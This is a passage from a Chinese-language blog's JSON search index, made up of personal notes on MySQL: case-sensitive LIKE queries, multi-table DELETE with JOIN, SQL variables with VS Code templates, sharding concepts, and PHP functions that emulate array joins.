關於網路那些事…</a></li>\n<li><a href=\"https://blog.gslin.org/archives/2012/07/17/2911/%E5%B0%8D-mysql-%E7%9A%84-varchar-%E6%AC%84%E4%BD%8D%E4%BD%BF%E7%94%A8-index-%E6%99%82%E5%8F%AF%E4%BB%A5%E5%A2%9E%E5%8A%A0%E6%95%88%E7%8E%87%E7%9A%84%E6%96%B9%E6%B3%95/\" target=\"_blank\" rel=\"noopener\">對 MySQL 的 VARCHAR 欄位使用 INDEX 時可以增加效率的方法… – Gea-Suan Lin’s BLOG</a></li>\n<li><a href=\"http://lanfar.pixnet.net/blog/post/40706817-sql%EF%BC%9Aselect%E8%8B%B1%E6%95%B8%E5%AD%97%E4%B8%8D%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E3%80%81%E4%B8%8D%E5%88%86%E5%85%A8%E5%8D%8A%E5%BD%A2%E3%80%81%E5%BF%BD\" target=\"_blank\" rel=\"noopener\">SQL：SELECT英數字不分大小寫、不分全半形、忽略空白 @ 姊姊❉心得報告 :: 痞客邦 ::</a></li>\n<li><a href=\"http://inspiregate.com/programming/mysql/363-mysql-like-queries-are-case-sensitive.html\" target=\"_blank\" rel=\"noopener\">MySQL 的 LIKE 查詢區分大小寫 | InspireGate 派克空間</a></li>\n<li><a href=\"http://hant.ask.helplib.com/oracle/post_706515\" target=\"_blank\" rel=\"noopener\">为什么oracle区分大小写？<em>oracle</em>帮酷编程问答</a></li>\n<li><a href=\"https://stackoverflow.com/questions/14007450/how-do-you-force-mysql-like-to-be-case-sensitive\" target=\"_blank\" rel=\"noopener\">sql - How do you force mysql LIKE to be case sensitive? - Stack Overflow</a></li>\n<li><a href=\"http://sqlfiddle.com/#!15/9314a/16\" target=\"_blank\" rel=\"noopener\">SQL Fiddle</a></li>\n<li><a href=\"https://stackoverflow.com/questions/8083455/like-case-sensitive-in-mysql\" target=\"_blank\" rel=\"noopener\">Like Case Sensitive in MySQL - Stack Overflow</a></li>\n<li><a href=\"https://www.google.com/search?client=firefox-b-ab&amp;q=postgresql+like+case+insensitive&amp;spell=1&amp;sa=X&amp;ved=0ahUKEwi8-LWd-qvfAhWKvbwKHWR6C-kQBQgpKAA&amp;biw=1920&amp;bih=966\" target=\"_blank\" rel=\"noopener\">postgresql like case insensitive - Google 搜尋</a></li>\n<li><a href=\"https://blog.gslin.org/archives/2014/02/09/4237/mysql-%E8%A3%A1%E6%90%9C%E5%B0%8B-charvarchar-string-%E6%AC%84%E4%BD%8D%E6%99%82%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/\" target=\"_blank\" rel=\"noopener\">MySQL 裡搜尋 CHAR/VARCHAR (String) 欄位時要注意的事情 – Gea-Suan Lin’s BLOG</a></li>\n</ul>\n","categories":["MySQL"],"tags":["mysql","like"]},{"title":"MySQL delete 一次刪除指定多個資料表欄位方法","url":"/blog/2019/04/20/MySQL-delete-%E4%B8%80%E6%AC%A1%E5%88%AA%E9%99%A4%E6%8C%87%E5%AE%9A%E5%A4%9A%E5%80%8B%E8%B3%87%E6%96%99%E8%A1%A8%E6%AC%84%E4%BD%8D%E6%96%B9%E6%B3%95/","content":"<p>上一篇，要嘗試刪除語句<br>在想刪除主表後，其餘關聯表示不是需要手動刪除??<br>但這篇先不談這個<br>最近看到兩篇發現 sql delete 可以做 join 動作刪除!!!<br>先來筆記吧!!</p>\n<a id=\"more\"></a>\n<ul>\n<li><a href=\"https://cloud.tencent.com/developer/ask/55599\" target=\"_blank\" rel=\"noopener\">SQL：如何实现带有内连接的 DELETE？ - 问答 - 云+社区 - 腾讯云</a></li>\n<li><a href=\"https://www.cnblogs.com/luluping/archive/2009/05/21/1486549.html\" target=\"_blank\" rel=\"noopener\">SQL 中使用 update inner join 和 delete inner join - linFen - 博客园</a></li>\n</ul>\n<p>發現可能不是每個 DB 都可以這樣做<br>db2 可能沒有!! <a href=\"https://www.ibm.com/support/knowledgecenter/en/SSEPEK_10.0.0/sqlref/src/tpc/db2z_sql_delete.html\" target=\"_blank\" rel=\"noopener\">IBM DELETE 介紹頁面</a><br>但為什麼我想一次做完呢?<br>因為現在 DB 我們公司做 auto commit<br>所以我想一次解決 XDD</p>\n<p>指細看也沒有人說不要用</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- DELETE 刪除大法</span></span><br><span class=\"line\"><span class=\"keyword\">delete</span> a1, a2 <span class=\"keyword\">FROM</span> <span class=\"string\">`db`</span>.<span class=\"string\">`a1_table`</span> a1 <span class=\"keyword\">JOIN</span> <span class=\"string\">`db`</span>.<span class=\"string\">`a2_table`</span> a2 <span class=\"keyword\">ON</span> a1.id = a2.a1_id <span class=\"keyword\">WHERE</span> a1.id = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">-- 另類刪除方法</span></span><br><span class=\"line\"><span class=\"keyword\">delete</span> a1, a2 <span class=\"keyword\">FROM</span> <span class=\"string\">`db`</span>.<span class=\"string\">`a1_table`</span> a1, <span class=\"string\">`db`</span>.<span class=\"string\">`a2_table`</span> a2 <span class=\"keyword\">WHERE</span> a1.id = a2.a1_id <span class=\"keyword\">and</span> a1.id =<span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>這邊有小提示</p>\n<p>delete <code>...</code> from 中間是指要刪除的表格(可以使用自訂的 table)</p>\n<p>這邊上面用 inner join 會遇到有一個問題<br>所以當關聯表沒資料，就不會刪掉<br>所以改成 left join 會比較好</p>\n<p>強者我同事之前提過 letcode 有人這樣解題<br><a href=\"https://github.com/int32bit/leetcode/tree/master/database/DeleteDuplicateEmails\" target=\"_blank\" rel=\"noopener\">leetcode/database/DeleteDuplicateEmails at master · int32bit/leetcode</a></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DELETE</span> p1 <span class=\"keyword\">FROM</span> Person p1,</span><br><span class=\"line\">    Person p2</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span></span><br><span class=\"line\">    p1.Email = p2.Email <span class=\"keyword\">AND</span> p1.Id &gt; p2.Id</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://www.mysqltutorial.org/mysql-delete-join/\" target=\"_blank\" rel=\"noopener\">MySQL DELETE JOIN: Deleting Data from Multiple Tables</a><br>先記到這樣!!!</p>\n","categories":["MySQL"],"tags":["mysql","delete"]},{"title":"MySQL 使用變數和 vscode 快速產生內容範本","url":"/blog/2019/09/15/MySQL-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8%E5%92%8C-vscode-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%85%A7%E5%AE%B9%E7%AF%84%E6%9C%AC/","content":"<p>最近重複的工作做一些改進<br>如每個月重複執行 SQL 內容<br>需要更快、還要更方便設定方法</p>\n<a id=\"more\"></a>\n<h2 id=\"MySQL-set-variable\"><a href=\"#MySQL-set-variable\" class=\"headerlink\" title=\"MySQL set variable\"></a>MySQL set variable</h2><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">set</span> @_id = xxx;</span><br><span class=\"line\"><span class=\"comment\">-- SELECT MAX(id)+1 FROM `xxx`</span></span><br><span class=\"line\"><span class=\"keyword\">set</span> @<span class=\"keyword\">name</span> = <span class=\"string\">'name'</span>;</span><br><span class=\"line\"><span class=\"comment\">-- SELECT * FROM `xxx` WHERE name LIKE '%name%'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">set</span> @money = <span class=\"number\">-140</span>; <span class=\"comment\">-- how much</span></span><br><span class=\"line\"><span class=\"keyword\">set</span> @<span class=\"keyword\">end</span> = <span class=\"literal\">NULL</span>; <span class=\"comment\">-- format(EX:2018-10-26 19:00:00) or NULL</span></span><br><span class=\"line\"><span class=\"keyword\">set</span> @bye_date = <span class=\"literal\">NULL</span>; <span class=\"comment\">-- format(EX:2018-10-26 19:00:00) or NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> <span class=\"string\">`pay_type`</span>(<span class=\"keyword\">id</span>,<span class=\"keyword\">name</span>,money)  <span class=\"keyword\">VALUES</span>(@_id,@<span class=\"keyword\">name</span>,@money);</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://dev.mysql.com/doc/refman/8.0/en/set-variable.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 8.0 Reference Manual :: 13.7.6.1 SET Syntax for Variable Assignment</a></p>\n<p>有用過，不能用在 <code>CREATE TABLE ...</code></p>\n<h2 id=\"vscode-Blueprint\"><a href=\"#vscode-Blueprint\" class=\"headerlink\" title=\"vscode Blueprint\"></a>vscode Blueprint</h2><p>不管任何程式都可以使用<br>詳細看裡面的測試圖片就可以了解怎麼使用<br><a href=\"https://github.com/reesemclean/blueprint\" target=\"_blank\" rel=\"noopener\">reesemclean/blueprint: Create files and folders of files from templates in Visual Studio Code</a></p>\n<p>./blueprint-templates/測試demo/<strong>name</strong>test.sql<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`xxxx`</span>.<span class=\"string\">`&#123;&#123; $table &#125;&#125;`</span> (</span><br><span class=\"line\">  <span class=\"string\">`id`</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> auto_increment,</span><br><span class=\"line\">  <span class=\"string\">`s`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">10</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">  <span class=\"string\">`s2`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">10</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">  <span class=\"string\">`user_number`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">100</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">  PRIMARY <span class=\"keyword\">KEY</span>  (<span class=\"string\">`id`</span>)</span><br><span class=\"line\">  <span class=\"keyword\">KEY</span> <span class=\"string\">`s`</span> (<span class=\"string\">`s`</span>),</span><br><span class=\"line\">  <span class=\"keyword\">KEY</span> <span class=\"string\">`s2`</span> (<span class=\"string\">`s2`</span>)</span><br><span class=\"line\">) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">InnoDB</span>  <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">CHARSET</span>=utf8 <span class=\"keyword\">COMMENT</span>=<span class=\"string\">'&#123;&#123;$表格註解&#125;&#125;'</span> AUTO_INCREMENT=<span class=\"number\">1</span> ;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"其他小記\"><a href=\"#其他小記\" class=\"headerlink\" title=\"其他小記\"></a>其他小記</h2><p>有一個 Blueprint 跟 API Blueprint 沒有關係<br>相關教學連結<br><a href=\"https://www.facebook.com/kewang.information/posts/1940647046211660\" target=\"_blank\" rel=\"noopener\">Kewang 的資訊進化論 - 貼文</a></p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"MySQL sharding初步認識小記","url":"/blog/2019/05/03/MySQL-sharding%E5%88%9D%E6%AD%A5%E8%AA%8D%E8%AD%98%E5%B0%8F%E8%A8%98/","content":"<p>之前有做 Sharding 簡單紀錄<a href=\"https://malagege.github.io/blog/2018/12/27/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/\">MySQL 不錯優化文章&amp;DB 雜記 | 程式狂想筆記</a><br>最近工作上發現我還是沒有很了解 Sharding<br>在工作上有很大的誤解<br>當然這篇不會記錄到很深入<br>只是記錄我的錯誤觀念改正</p>\n<a id=\"more\"></a>\n<h2 id=\"首先做-Sharding，不能做-join-動作\"><a href=\"#首先做-Sharding，不能做-join-動作\" class=\"headerlink\" title=\"首先做 Sharding，不能做 join 動作\"></a>首先做 Sharding，不能做 join 動作</h2><p>因為先前開會，對方沒有講很清楚<br>我以為部分資料表可以同步到別的 Database<br>想說還是能做 join 問題<br>(沒想到沒有適用 mariadb sharding 功能)<br>但是，最近問相關問題的時候<br>問到 join 相關事情，有得到消息是<code>不能做join</code>事情<br>當然也不會使用到類似 MariaDB Spider 東西<br>連線所有抓資料<code>要用程式處理</code><br>當然有些 count,group by 動作可能都用程式處理了</p>\n<p><del>當然想說這麼複雜的東西交給工程師用很冏</del></p>\n<blockquote>\n<p>3、跨節點合併排序分頁問題<br>一旦進行了數據的水平切分之後，可能就並不僅僅只有跨節點 Join 無法正常運行，有些排序分頁的 Query 語句的數據源可能也會被切分到多個節點，這樣造成的直接後果就是這些排序分頁 Query 無法繼續正常運行。其實這和跨節點 Join 是一個道理，數據源存在於多個節點上，要通過一個 Query 來解決，就和跨節點 Join 是一樣的操作。同樣 Federated 也可以部分解決，當然存在的風險也一樣。<br>還是同樣的問題，怎麼辦？我同樣仍然繼續建議通過應用程序來解決。<br>如何解決？解決的思路大體上和跨節點 Join 的解決類似，但是有一點和跨節點 Join 不太一樣，Join 很多時候都有一個驅動與被驅動的關係，所以 Join 本身涉及到的多個表之間的數據讀取一般都會存在一個順序關係。但是排序分頁就不太一樣了，排序分頁的數據源基本上可以說是一個表（或者一個結果集），本身並不存在一個順序關係，所以在從多個數據源取數據的過程是完全可以並行的。這樣，排序分頁數據的取數效率我們可以做的比跨庫 Join 更高，所以帶來的性能損失相對的要更小，在有些情況下可能比在原來未進行數據切分的數據庫中效率更高了。當然，不論是跨節點 Join 還是跨節點排序分頁，都會使我們的應用服務器消耗更多的資源，尤其是內存資源，因為我們在讀取訪問以及合併結果集的這個過程需要比原來處理更多的數據。<br>分析到這裡，可能很多讀者朋友會發現，上面所有的這些問題，我給出的建議基本上都是通過應用程序來解決。大家可能心裡開始犯嘀咕了，是不是因為我是 DBA，所以就很多事情都扔給應用架構師和開發人員了？<br>其實完全不是這樣，首先應用程序由於其特殊性，可以非常容易做到很好的擴展性，但是數據庫就不一樣，必須借助很多其他的方式才能做到擴展，而且在這個擴展過程中，很難避免帶來有些原來在集中式數據庫中可以解決但被切分開成一個數據庫集群之後就成為一個難題的情況。要想讓系統整體得到最大限度的擴展，我們只能讓應用程序做更多的事情，來解決數據庫集群無法較好解決的問題。<br>作者：浮浮尘尘<br>链接：<a href=\"https://www.jianshu.com/p/6ebafabfddae\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/6ebafabfddae</a><br>来源：简书<br>简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</p>\n</blockquote>\n<p><del>看著看著眼淚掉出來</del></p>\n<ul>\n<li><a href=\"https://blog.csdn.net/bluishglc/article/details/6161475\" target=\"_blank\" rel=\"noopener\">数据库 Sharding 的基本思想和切分策略 - Laurence 的技术博客 - CSDN 博客</a></li>\n<li><a href=\"https://www.jianshu.com/p/6ebafabfddae\" target=\"_blank\" rel=\"noopener\">MySQL Sharding 详解 - 简书</a></li>\n<li><a href=\"http://database.51cto.com/art/201809/583857.htm\" target=\"_blank\" rel=\"noopener\">MySQL 分库分表，写得太好了！ - 51CTO.COM</a></li>\n<li><a href=\"https://blog.gslin.org/archives/2017/02/02/7113/mysql-%E4%B8%8A-sharding-%E7%9A%84%E6%96%B9%E6%A1%88/\" target=\"_blank\" rel=\"noopener\">MySQL 上 sharding 的方案 | Gea-Suan Lin’s BLOG</a></li>\n<li><a href=\"https://malagege.github.io/blog/2018/12/27/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/\">MySQL 不錯優化文章&amp;DB 雜記 | 程式狂想筆記</a></li>\n<li><a href=\"http://hongyitong.github.io/2016/12/16/%E5%88%86%E8%A1%A8%E5%88%86%E5%BA%93%EF%BC%88%E6%95%B0%E6%8D%AE%E5%BA%93%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98%EF%BC%89%20/\" target=\"_blank\" rel=\"noopener\">数据库 Sharding 的基本思想和切分策略（分库分表） | 忆桐之家的博客</a></li>\n<li><a href=\"https://dbaplus.cn/news-11-1854-1.html\" target=\"_blank\" rel=\"noopener\">方案虽好，成本先行：数据库 Sharding+Proxy 实践解析 - MySQL - dbaplus 社群：围绕 Data、Blockchain、AiOps 的企业级专业社群。技术大咖、原创干货，每天精品原创文章推送，每周线上技术分享，每月线下技术沙龙。</a></li>\n<li><a href=\"https://www.itread01.com/content/1545726433.html\" target=\"_blank\" rel=\"noopener\">MySql 從一竅不通到入門（五）Sharding：分表、分庫、分片和分割槽 - IT 閱讀</a></li>\n<li><a href=\"https://blog.csdn.net/KingCat666/article/details/78325158\" target=\"_blank\" rel=\"noopener\">MySql 从一窍不通到入门（九）Sharding 的实现和规避 - Invoker’s Tower - CSDN 博客</a></li>\n<li><a href=\"https://www.zhihu.com/question/22521550\" target=\"_blank\" rel=\"noopener\">现在 mysql 的分布式数据访问层主流方案有哪些? - 知乎</a></li>\n<li><a href=\"https://yq.aliyun.com/articles/404971\" target=\"_blank\" rel=\"noopener\">传统分库分表(sharding)的缺陷与破解之法-云栖社区-阿里云</a></li>\n</ul>\n<h2 id=\"分表方式\"><a href=\"#分表方式\" class=\"headerlink\" title=\"分表方式\"></a>分表方式</h2><ol>\n<li>用非 Sharding 某一張記錄 sharding，如<a href=\"http://database.51cto.com/art/201809/583857.htm\" target=\"_blank\" rel=\"noopener\">MySQL 分库分表，写得太好了！ - 51CTO.COM</a></li>\n</ol>\n<p>用程式去做導向動作</p>\n<ol start=\"2\">\n<li>用%(程式餘數)去做分割</li>\n</ol>\n<p>當初看這段有想到之後擴增 Sharding 不是要做資料轉移<br>剛好這篇有提到 <a href=\"https://blog.csdn.net/lihongxun945/article/details/51482903\" target=\"_blank\" rel=\"noopener\">数据库 sharding 和一致性哈希算法 - 言川的博客 - CSDN 博客</a><br>擴增事要做資料轉移的</p>\n<p>現有 code，可以參考 open bilibili 有實作這個功能 XDD</p>\n<h2 id=\"Sharding-各-table-的主鍵-id-不能重複\"><a href=\"#Sharding-各-table-的主鍵-id-不能重複\" class=\"headerlink\" title=\"Sharding 各 table 的主鍵 id 不能重複\"></a>Sharding 各 table 的主鍵 id 不能重複</h2><ol>\n<li>Sharding DB 設定 auto_increment 起始不一樣。(ex:DB1 0, DB2 10000000)</li>\n<li>拿不會重複資料串流水號，(EX:(USER_ID)UUID+id)</li>\n</ol>\n<h2 id=\"另類-DB-實作作法\"><a href=\"#另類-DB-實作作法\" class=\"headerlink\" title=\"另類 DB 實作作法\"></a>另類 DB 實作作法</h2><blockquote>\n<p>Vitess 就是由 Youtube 團隊為了解決資料量龐大、邏輯複雜導致 Query 的錯誤率升高，讓 Youtube 工程團隊有解不完的 Bug、加不完的班。又幸好當時寫這套前端窗口的人致力開源這份程式碼，才讓後世的人能不用辛苦地寫一份這種可怕的東西(我想也沒多少人寫得出來)。</p>\n</blockquote>\n<p><a href=\"https://www.infoq.cn/article/NHSAAmN*MfpLiTiTTEu5\" target=\"_blank\" rel=\"noopener\">对比 Vitess，ShardingSphere 有哪些不同</a><br><a href=\"https://a28283878.github.io/documents/Database-Scaling-Vitess.html\" target=\"_blank\" rel=\"noopener\">Mysql — sharding , partitioning | Richard’s Blog</a><br>kingshard<br><a href=\"https://github.com/flike/kingshard/blob/master/doc/KingDoc/how_to_use_kingshard.md\" target=\"_blank\" rel=\"noopener\">kingshard/how_to_use_kingshard.md at master · flike/kingshard · GitHub</a></p>\n<h2 id=\"我有個大膽的想法\"><a href=\"#我有個大膽的想法\" class=\"headerlink\" title=\"我有個大膽的想法\"></a>我有個大膽的想法</h2><p>如果兩個 Array 做 join 動作有什麼做法?</p>\n<p>後來有找到這個<br><a href=\"https://hant.helplib.com/Web_Development/article_3813\" target=\"_blank\" rel=\"noopener\">LINQ PHP 比較：YaLinqo，Ginq，Pinq<em>Web 開發</em>幫酷</a><br><a href=\"http://io.gchatelier.fr/blog/yalinqo-linq-php-exemple/#joio\" target=\"_blank\" rel=\"noopener\">YaLinqo port de .NET 4 LINQ vers PHP - Par l’exemple</a></p>\n<p><strong>Yalinqo 裡面的 join 跟 SQL Join 好像不太一樣</strong><br>當然也有找到程式自幹的，<a href=\"https://stackoverflow.com/questions/25836473/how-to-simulate-the-sql-left-join-operation-using-php-arrays\" target=\"_blank\" rel=\"noopener\">How to simulate the SQL LEFT JOIN operation using PHP arrays? - Stack Overflow</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//function to simulate the left join</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">left_join_array</span>(<span class=\"params\">$left, $right, $left_join_on, $right_join_on = NULL</span>)</span>&#123;</span><br><span class=\"line\">        $final= array();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(empty($right_join_on))</span><br><span class=\"line\">            $right_join_on = $left_join_on;</span><br><span class=\"line\"></span><br><span class=\"line\">        foreach($left AS $k =&gt; $v)&#123;</span><br><span class=\"line\">            $final[$k] = $v;</span><br><span class=\"line\">            foreach($right AS $kk =&gt; $vv)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>($v[$left_join_on] == $vv[$right_join_on])&#123;</span><br><span class=\"line\">                    foreach($vv AS $key =&gt; $val)</span><br><span class=\"line\">                        $final[$k][$key] = $val;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    foreach($vv AS $key =&gt; $val)</span><br><span class=\"line\">                        $final[$k][$key] = NULL;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> $final;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>比較特別要 join 兩個欄位，名稱可以不一樣，所以後面兩個參數是用來對應關聯屬性<br>我這邊有簡單實作<a href=\"http://sandbox.onlinephpfunctions.com/code/72c7b55bc7cf39f57454c5641e9e1ffd4758b178\" target=\"_blank\" rel=\"noopener\">PHP Sandbox, test PHP online, PHP tester</a></p>\n<p>後來發現 join 空資料時候會有問題，小小修正</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">left_join_array</span>(<span class=\"params\">$left, $right, $left_join_on, $right_join_on = NULL</span>)</span>&#123;</span><br><span class=\"line\">    $final= array();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(empty($right_join_on))</span><br><span class=\"line\">        $right_join_on = $left_join_on;</span><br><span class=\"line\"></span><br><span class=\"line\">    foreach($left AS $k =&gt; $v)&#123;</span><br><span class=\"line\">        $final[$k] = $v;</span><br><span class=\"line\">        foreach($right AS $kk =&gt; $vv)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>($v[$left_join_on] == $vv[$right_join_on])&#123;</span><br><span class=\"line\">                foreach($vv AS $key =&gt; $val)</span><br><span class=\"line\">                    $final[$k][$key] = $val;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                foreach($vv AS $key =&gt; $val)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>($key == $left_join_on) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                    $final[$k][$key] = NULL;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> $final;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>改寫 inner join</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">left_join_array</span>(<span class=\"params\">$left, $right, $left_join_on, $right_join_on = NULL</span>)</span>&#123;</span><br><span class=\"line\">    $final= array();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(empty($right_join_on))</span><br><span class=\"line\">        $right_join_on = $left_join_on;</span><br><span class=\"line\"></span><br><span class=\"line\">    foreach($left AS $k =&gt; $v)&#123;</span><br><span class=\"line\">        foreach($right AS $kk =&gt; $vv)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>($v[$left_join_on] == $vv[$right_join_on])&#123;</span><br><span class=\"line\">                $final[$k] = $v;</span><br><span class=\"line\">                foreach($vv AS $key =&gt; $val)</span><br><span class=\"line\">                    $final[$k][$key] = $val;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> $final;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"找到其他套件\"><a href=\"#找到其他套件\" class=\"headerlink\" title=\"找到其他套件\"></a>找到其他套件</h3><p><a href=\"https://github.com/erdalceylan/array-join\" target=\"_blank\" rel=\"noopener\">GitHub - erdalceylan/array-join: php array join</a></p>\n<h3 id=\"排序問題\"><a href=\"#排序問題\" class=\"headerlink\" title=\"排序問題\"></a>排序問題</h3><p><a href=\"https://stackoverflow.com/questions/2699086/how-to-sort-multi-dimensional-array-by-value\" target=\"_blank\" rel=\"noopener\">php - How to Sort Multi-dimensional Array by Value? - Stack Overflow</a></p>\n<h3 id=\"效能上的問題\"><a href=\"#效能上的問題\" class=\"headerlink\" title=\"效能上的問題\"></a>效能上的問題</h3><blockquote>\n<p>其次你 left_join_array 功能是一個問題，它的速度是 O(n^3)，速度很慢，並儘可能內存去你分配噸也是如此，但在我們談論如何優化數據之前，我需要更多關於您想要處理數據的信息。<br>MySQL 將總是比任何你能在幾分鐘內寫速度更快，尤其是如果你沒有關於如何 RDBMS 工作的任何知識。您可以儘可能多地模擬它，但 MySQL 應該至少快一個數量級; MySQL 的連接算法是 O((n<em>m) log(n</em>m))，你的算法指數級地慢（字面上）。</p>\n</blockquote>\n<p><a href=\"http://cn.voidcc.com/question/p-vznlcvcp-tn.html\" target=\"_blank\" rel=\"noopener\">PHP 脚本 - VoidCC</a><br><a href=\"https://stackoverflow.com/questions/46408886/php-script-for-optimizing-loading-csv-data/46409077#46409077\" target=\"_blank\" rel=\"noopener\">algorithm - PHP script for optimizing loading CSV data - Stack Overflow</a><br>請用在資料少上面</p>\n<h3 id=\"物件快速轉陣列方法\"><a href=\"#物件快速轉陣列方法\" class=\"headerlink\" title=\"物件快速轉陣列方法\"></a>物件快速轉陣列方法</h3><p><code>json_decode(json_encode(\\$products), true);</code><br><a href=\"https://stackoverflow.com/questions/4345554/convert-php-object-to-associative-array\" target=\"_blank\" rel=\"noopener\">Convert PHP object to associative array - Stack Overflow</a></p>\n<p>其他想到再補…</p>\n<p><strong>2020-06-13</strong></p>\n<p>最近在看 Procedure stored 處理大量資料是不是最好解<br>看起來大量資料是…<br>在這之間有查到 sharding 文章覺得不錯，並整理一下</p>\n<p><a href=\"https://medium.com/@allaboutdataanalysis/%E5%AF%AB%E5%A5%BDsql%E5%BE%88%E6%9C%89%E5%BF%85%E8%A6%81-3206014d5422\" target=\"_blank\" rel=\"noopener\">寫好SQL很有必要！ - 數據分析那些事 - Medium</a> <a href=\"/blog/2019/05/03/MySQL-sharding初步認識小記/web1.png\" title=\"備份圖\">備份圖</a></p>\n<p><a href=\"https://www.cnblogs.com/jshen/p/7682502.html\" target=\"_blank\" rel=\"noopener\">分庫分表的基本思想 - -j神—– - 博客園</a> <a href=\"/blog/2019/05/03/MySQL-sharding初步認識小記/web2.png\" title=\"備份圖\">備份圖</a></p>\n<p>其他沒相關的整理</p>\n<p><a href=\"https://blog.darkthread.net/blog/async-batch-update-performance/\" target=\"_blank\" rel=\"noopener\">使用非同步處理提升資料庫更新速度-黑暗執行緒</a></p>\n<p><a href=\"https://stackoverflow.com/questions/46051642/can-i-rollback-after-calling-stored-procedure-in-java-test\" target=\"_blank\" rel=\"noopener\">oracle - Can I rollback after calling stored procedure in java test? - Stack Overflow</a></p>\n<p><strong>2020-06-18</strong></p>\n<ul>\n<li><p><a href=\"https://cloud.tencent.com/developer/article/1506228\" target=\"_blank\" rel=\"noopener\">一次分表踩坑实践的探讨 - 云+社区 - 腾讯云</a><br>sharding 做報表還是很大的難題阿!!</p>\n</li>\n<li><p><a href=\"https://www.jianshu.com/p/9a21b4f9c3dd\" target=\"_blank\" rel=\"noopener\">SpringBoot2.x集成Sharding-JDBC实现分库分表 - 简书</a></p>\n</li>\n<li><p><a href=\"https://www.jianshu.com/p/74c02a2a89de\" target=\"_blank\" rel=\"noopener\">Spring boot+mybatis+mysql+ sharding-jdbc实现分库分表学习demo - 簡書</a></p>\n</li>\n<li><p><a href=\"https://codertw.com/ios/61625/\" target=\"_blank\" rel=\"noopener\">為什麼要用spring-data-jpa而不直接用hibernate | 程式前沿</a></p>\n</li>\n</ul>\n","categories":["MySQL"],"tags":["mysql","sharding"]},{"title":"MySQL 比較兩個資料庫方法","url":"/blog/2019/09/12/MySQL-%E6%AF%94%E8%BC%83%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E5%BA%AB%E6%96%B9%E6%B3%95/","content":"<p>先留者，有空再實作看看</p>\n<blockquote>\n<p>Red-Gate’s MySQL Schema &amp; Data 